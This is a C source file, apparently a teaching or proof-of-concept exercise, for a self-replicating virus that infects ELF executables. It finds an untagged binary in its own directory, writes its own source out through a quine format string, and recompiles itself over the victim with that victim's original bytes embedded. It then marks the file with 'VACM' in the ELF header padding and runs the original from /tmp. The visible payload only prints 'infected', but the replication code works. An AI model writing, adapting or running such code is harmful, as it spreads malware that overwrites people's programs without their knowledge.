#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>
#include <unistd.h>
#include <sys/user.h>
#include <elf.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
char buff[1<<20];
char code[1<<20];
void put_infected(char *filename){
	FILE *fp=fopen(filename,"r");
	int size=fread(buff,1,1<<20,fp);
	fclose(fp);	
	buff[EI_PAD]='V';
	buff[EI_PAD+1]='A';
	buff[EI_PAD+2]='C';
	buff[EI_PAD+3]='M';
	fp=fopen(filename,"w");
	fwrite(buff,1,size,fp);
	fclose(fp);				
}
int check(char *filename){

	FILE *fp=fopen(filename,"r");
	if(fp==NULL)return 1;
	int size=fread(buff,1,1<<20,fp);
	fclose(fp);	
	if(size>(1<<20))return 1;
	
	Elf64_Ehdr *ehdr=(Elf64_Ehdr*)buff;
	if(ehdr->e_ident[EI_MAG0]!=0x7f 
		||ehdr->e_ident[EI_MAG1]!='E'
		||ehdr->e_ident[EI_MAG2]!='L'
		||ehdr->e_ident[EI_MAG3]!='F')
	return 1;
	
			

	int flag=1;
	if(ehdr->e_ident[EI_PAD]!='V'
		||ehdr->e_ident[EI_PAD+1]!='A'
		||ehdr->e_ident[EI_PAD+2]!='C'
		||ehdr->e_ident[EI_PAD+3]!='M'){
			flag=0;
		}
		

		
	return flag;
	
}

//hello
int hellosize=8696;
char *hello="";

void run_old(){
	FILE *tmp=fopen("/tmp/_tmp","w");
	fwrite(hello,1,hellosize,tmp);
	fclose(tmp);
	system("chmod +x /tmp/_tmp");
	execl("/tmp/_tmp",0);
}
void bad(){
	puts("infected");
}
char victim[111];
void function1() {
	bad();
	char path[111],name[111];
	readlink("/proc/self/exe", path, sizeof(path));
	int len=strlen(path),i,j;
	for(i=len-1;i>=0;i--)if(path[i]=='/'){
		path[i]=0;
		for(j=i+1;j<len;j++)
			name[j-i-1]=path[j];
		name[len-i-1]=0;
		break;
	}
	DIR  *dir;
    struct    dirent    *ptr;
    
    int getvictim=0;
    dir = opendir(path);
    while((ptr = readdir(dir)) != NULL){
    	if(strcmp(name,ptr->d_name)){
	    	if(!check(ptr->d_name)){
				getvictim=1;
				strcpy(victim,ptr->d_name);	    
				fprintf(stderr,"victim is %s\n",victim);
				break;
	    	}
	    }
    }
    closedir(dir);
    
    if(!getvictim){
    	run_old();
    }
}
void function2() {
	FILE *newv=fopen("/tmp/_self","r");
	FILE *newc=fopen("__tmp.c","w");
	FILE *fv=fopen(victim,"r");
	int size=fread(code,1,1<<20,fv);
	if(size>(1<<20))run_old();
	
	
	fprintf(stderr,"infect %s\n",victim);
	int cur=0,i;
	while(fgets(buff,1<<20,newv)){
		if(cur==2){
			fprintf(newc,"int hellosize=%d;\n",size);
			cur--;
		}else if(cur==1){
			//char *hello="";
			fprintf(newc,"char *hello=\"");
			for(i=0;i<size;i++)
				fprintf(newc,"\\x%02x",((int)code[i])&255);
			fprintf(newc,"\";\n");
			cur--;
		}else fputs(buff,newc);
		if(strcmp(buff,"//hello\n")==0)cur=2;
	}
	
	fclose(newc);
	fclose(fv);
	fclose(newv);
	char cmd[111];
	sprintf(cmd,"gcc __tmp.c -o %s -g",victim);
	system(cmd);
	put_infected(victim);
	run_old();
}

int main()
{
function1();FILE *file=fopen("/tmp/_self","w");
char *s="#include <stdio.h>%c#include <stdlib.h>%c#include <inttypes.h>%c#include <string.h>%c#include <unistd.h>%c#include <sys/user.h>%c#include <elf.h>%c#include <errno.h>%c#include <sys/types.h>%c#include <dirent.h>%cchar buff[1<<20];%cchar code[1<<20];%cvoid put_infected(char *filename){%c%cFILE *fp=fopen(filename,%cr%c);%c%cint size=fread(buff,1,1<<20,fp);%c%cfclose(fp);%c%c%cbuff[EI_PAD]=%cV%c;%c%cbuff[EI_PAD+1]=%cA%c;%c%cbuff[EI_PAD+2]=%cC%c;%c%cbuff[EI_PAD+3]=%cM%c;%c%cfp=fopen(filename,%cw%c);%c%cfwrite(buff,1,size,fp);%c%cfclose(fp);%c%c%c%c%c}%cint check(char *filename){%c%c%cFILE *fp=fopen(filename,%cr%c);%c%cif(fp==NULL)return 1;%c%cint size=fread(buff,1,1<<20,fp);%c%cfclose(fp);%c%c%cif(size>(1<<20))return 1;%c%c%c%cElf64_Ehdr *ehdr=(Elf64_Ehdr*)buff;%c%cif(ehdr->e_ident[EI_MAG0]!=0x7f %c%c%c||ehdr->e_ident[EI_MAG1]!=%cE%c%c%c%c||ehdr->e_ident[EI_MAG2]!=%cL%c%c%c%c||ehdr->e_ident[EI_MAG3]!=%cF%c)%c%creturn 1;%c%c%c%c%c%c%c%c%cint flag=1;%c%cif(ehdr->e_ident[EI_PAD]!=%cV%c%c%c%c||ehdr->e_ident[EI_PAD+1]!=%cA%c%c%c%c||ehdr->e_ident[EI_PAD+2]!=%cC%c%c%c%c||ehdr->e_ident[EI_PAD+3]!=%cM%c){%c%c%c%cflag=0;%c%c%c}%c%c%c%c%c%c%c%c%creturn flag;%c%c%c}%c%c//hello%cint hellosize=8696;%cchar *hello=%c%c;%c%cvoid run_old(){%c%cFILE *tmp=fopen(%c/tmp/_tmp%c,%cw%c);%c%cfwrite(hello,1,hellosize,tmp);%c%cfclose(tmp);%c%csystem(%cchmod +x /tmp/_tmp%c);%c%cexecl(%c/tmp/_tmp%c,0);%c}%cvoid bad(){%c%cputs(%cinfected%c);%c}%cchar victim[111];%cvoid function1() {%c%cbad();%c%cchar path[111],name[111];%c%creadlink(%c/proc/self/exe%c, path, sizeof(path));%c%cint len=strlen(path),i,j;%c%cfor(i=len-1;i>=0;i--)if(path[i]==%c/%c){%c%c%cpath[i]=0;%c%c%cfor(j=i+1;j<len;j++)%c%c%c%cname[j-i-1]=path[j];%c%c%cname[len-i-1]=0;%c%c%cbreak;%c%c}%c%cDIR  *dir;%c    struct    dirent    *ptr;%c    %c    int getvictim=0;%c    dir = opendir(path);%c    while((ptr = readdir(dir)) != NULL){%c    %cif(strcmp(name,ptr->d_name)){%c%c    %cif(!check(ptr->d_name)){%c%c%c%c%cgetvictim=1;%c%c%c%c%cstrcpy(victim,ptr->d_name);%c    %c%c%c%c%cfprintf(stderr,%cvictim is %cs%cn%c,victim);%c%c%c%c%cbreak;%c%c    %c}%c%c    }%c    }%c    closedir(dir);%c    %c    if(!getvictim){%c    %crun_old();%c    }%c}%cvoid function2() {%c%cFILE *newv=fopen(%c/tmp/_self%c,%cr%c);%c%cFILE *newc=fopen(%c__tmp.c%c,%cw%c);%c%cFILE *fv=fopen(victim,%cr%c);%c%cint size=fread(code,1,1<<20,fv);%c%cif(size>(1<<20))run_old();%c%c%c%c%c%cfprintf(stderr,%cinfect %cs%cn%c,victim);%c%cint cur=0,i;%c%cwhile(fgets(buff,1<<20,newv)){%c%c%cif(cur==2){%c%c%c%cfprintf(newc,%cint hellosize=%cd;%cn%c,size);%c%c%c%ccur--;%c%c%c}else if(cur==1){%c%c%c%c//char *hello=%c%c;%c%c%c%cfprintf(newc,%cchar *hello=%c%c%c);%c%c%c%cfor(i=0;i<size;i++)%c%c%c%c%cfprintf(newc,%c%c%cx%c02x%c,((int)code[i])&255);%c%c%c%cfprintf(newc,%c%c%c;%cn%c);%c%c%c%ccur--;%c%c%c}else fputs(buff,newc);%c%c%cif(strcmp(buff,%c//hello%cn%c)==0)cur=2;%c%c}%c%c%c%cfclose(newc);%c%cfclose(fv);%c%cfclose(newv);%c%cchar cmd[111];%c%csprintf(cmd,%cgcc __tmp.c -o %cs -g%c,victim);%c%csystem(cmd);%c%cput_infected(victim);%c%crun_old();%c}%c%cint main()%c{%cfunction1();FILE *file=fopen(%c/tmp/_self%c,%cw%c);%cchar *s=%c%s%c;%cfprintf(file,s,10,10,10,10,10,10,10,10,10,10,10,10,10,9,34,34,10,9,10,9,9,10,9,39,39,10,9,39,39,10,9,39,39,10,9,39,39,10,9,34,34,10,9,10,9,9,9,9,9,10,10,10,10,9,34,34,10,9,10,9,10,9,9,10,9,10,9,10,9,10,9,10,9,9,39,39,10,9,9,39,39,10,9,9,39,39,10,9,10,9,10,9,9,9,10,10,9,10,9,39,39,10,9,9,39,39,10,9,9,39,39,10,9,9,39,39,10,9,9,9,10,9,9,10,9,9,10,10,9,9,10,9,10,9,10,10,10,10,10,34,34,10,10,10,9,34,34,34,34,10,9,10,9,10,9,34,34,10,9,34,34,10,10,10,9,34,34,10,10,10,10,9,10,9,10,9,34,34,10,9,10,9,39,39,10,9,9,10,9,9,10,9,9,9,10,9,9,10,9,9,10,9,10,9,10,10,10,10,10,10,9,10,9,9,10,9,9,9,9,10,9,9,9,9,9,10,9,9,9,9,34,37,92,34,10,9,9,9,9,10,9,9,10,9,10,10,10,10,10,9,10,10,10,10,9,34,34,34,34,10,9,34,34,34,34,10,9,34,34,10,9,10,9,10,9,10,9,10,9,34,37,92,34,10,9,10,9,10,9,9,10,9,9,9,34,37,92,34,10,9,9,9,10,9,9,10,9,9,9,34,34,10,9,9,9,34,92,34,34,10,9,9,9,10,9,9,9,9,34,92,92,37,34,10,9,9,9,34,92,34,92,34,10,9,9,9,10,9,9,10,9,9,34,92,34,10,9,10,9,10,9,10,9,10,9,10,9,10,9,34,37,34,10,9,10,9,10,9,10,10,10,10,10,34,34,34,34,10,34,s,34,10,10,10);fclose(file);function2();%c}%c";
fprintf(file,s,10,10,10,10,10,10,10,10,10,10,10,10,10,9,34,34,10,9,10,9,9,10,9,39,39,10,9,39,39,10,9,39,39,10,9,39,39,10,9,34,34,10,9,10,9,9,9,9,9,10,10,10,10,9,34,34,10,9,10,9,10,9,9,10,9,10,9,10,9,10,9,10,9,9,39,39,10,9,9,39,39,10,9,9,39,39,10,9,10,9,10,9,9,9,10,10,9,10,9,39,39,10,9,9,39,39,10,9,9,39,39,10,9,9,39,39,10,9,9,9,10,9,9,10,9,9,10,10,9,9,10,9,10,9,10,10,10,10,10,34,34,10,10,10,9,34,34,34,34,10,9,10,9,10,9,34,34,10,9,34,34,10,10,10,9,34,34,10,10,10,10,9,10,9,10,9,34,34,10,9,10,9,39,39,10,9,9,10,9,9,10,9,9,9,10,9,9,10,9,9,10,9,10,9,10,10,10,10,10,10,9,10,9,9,10,9,9,9,9,10,9,9,9,9,9,10,9,9,9,9,34,37,92,34,10,9,9,9,9,10,9,9,10,9,10,10,10,10,10,9,10,10,10,10,9,34,34,34,34,10,9,34,34,34,34,10,9,34,34,10,9,10,9,10,9,10,9,10,9,34,37,92,34,10,9,10,9,10,9,9,10,9,9,9,34,37,92,34,10,9,9,9,10,9,9,10,9,9,9,34,34,10,9,9,9,34,92,34,34,10,9,9,9,10,9,9,9,9,34,92,92,37,34,10,9,9,9,34,92,34,92,34,10,9,9,9,10,9,9,10,9,9,34,92,34,10,9,10,9,10,9,10,9,10,9,10,9,10,9,34,37,34,10,9,10,9,10,9,10,10,10,10,10,34,34,34,34,10,34,s,34,10,10,10);fclose(file);function2();
}
